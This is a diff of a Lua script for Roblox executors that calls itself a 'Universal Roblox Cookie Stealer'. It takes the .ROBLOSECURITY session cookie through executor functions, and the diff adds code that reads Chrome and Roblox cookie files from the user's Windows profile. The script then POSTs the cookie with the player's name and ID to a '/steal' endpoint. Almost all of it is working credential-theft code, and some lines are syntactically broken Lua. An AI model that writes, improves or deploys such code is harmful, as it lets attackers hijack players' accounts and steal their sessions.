@@ -1,37 +1,54 @@
--- Universal Roblox Cookie Stealer
--- Works on ANY executor
-
+-- Universal Roblox Cookie Stealer (with Browser extraction)
 local player = game.Players.LocalPlayer
 local http = game:GetService("HttpService")
 
--- Get cookie from executor (different methods)
 local cookie = ""
 
--- Try every possible executor method
+-- Method 1: Executor cookie function
 if syn and syn.cookie then
     cookie = syn.cookie()
 elseif getcookie then
     cookie = getcookie()
-elseif getgenv and getgenv().cookie then
-    cookie = getgenv().cookie
-elseif shared and shared.cookie then
-    cookie = shared.cookie
 end
 
--- Build data
+-- Method 2: If cookie still empty, try to get from browser
+if cookie == "" or cookie == nil then
+    -- For Windows: Read from Chrome's local storage
+    local username = os.getenv("USERNAME")
+    local paths = {
+        "C:\\Users\\" .. username .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
+        "C:\\Users\\" .. username .. "\\AppData\\Roaming\\Roblox\\Cookies",
+    }
+    
+    for _, path in pairs(paths) do
+        if isfile and isfile(path) then
+            local content = readfile and readfile(path) or ""
+            if content and content:match("_|WARNING") then
+                cookie = content:match("_|WARNING[^\n]+")
+                break
+            end
+        end
+    end
+end
+
+-- Method 3: Manual input fallback
+if cookie == "" or cookie == nil then
+    cookie = "MANUAL_REQUIRED"
+    setclipboard and setclipboard("Go to Chrome F12 > Application > Cookies > .ROBLOSECURITY and paste here")
+end
+
 local data = {
     user = player.Name,
     userId = player.UserId,
-    cookie = cookie or "NO_COOKIE_FOUND",
+    cookie = cookie,
     time = os.time(),
     executor = identifyexecutor and identifyexecutor() or "Unknown"
 }
 
--- Try every possible request method
+-- Send to your server
 local sent = false
 
--- Method 1: syn.request (Synapse/Xeno/Luna)
-if syn and syn.request and not sent then
+if syn and syn.request then
     syn.request({
         Url = "http://localhost:8080/steal",
         Method = "POST",
@@ -39,10 +56,8 @@ if syn and syn.request and not sent then
         Body = http:JSONEncode(data)
     })
     sent = true
-    print("[✓] Sent with syn.request")
 end
 
--- Method 2: request (Krnl/Fluxus/Evon)
 if request and not sent then
     request({
         Url = "http://localhost:8080/steal",
@@ -51,34 +66,11 @@ if request and not sent then
         Body = http:JSONEncode(data)
     })
     sent = true
-    print("[✓] Sent with request")
 end
 
--- Method 3: http.request (ScriptWare)
-if http and http.request and not sent then
-    http:request({
-        Url = "http://localhost:8080/steal",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = http:JSONEncode(data)
-    })
-    sent = true
-    print("[✓] Sent with http.request")
-end
-
--- Method 4: Write file method (fallback)
-if writefile and not sent then
-    writefile("stolen_data.txt", http:JSONEncode(data))
-    print("[✓] Saved to file - send manually")
-end
-
--- Method 5: Clipboard method (last resort)
-if setclipboard and not sent then
-    setclipboard(http:JSONEncode(data))
-    print("[✓] Copied to clipboard - paste somewhere")
-end
-
-if not sent then
-    print("[✗] No request method found for this executor")
-    print("Executor: " .. (identifyexecutor and identifyexecutor() or "Unknown"))
+if sent then
+    print("Cookie sent: " .. (cookie ~= "" and "YES" or "NO"))
+else
+    print("Failed to send - copy this cookie manually: " .. cookie)
+    setclipboard and setclipboard(cookie)
 end
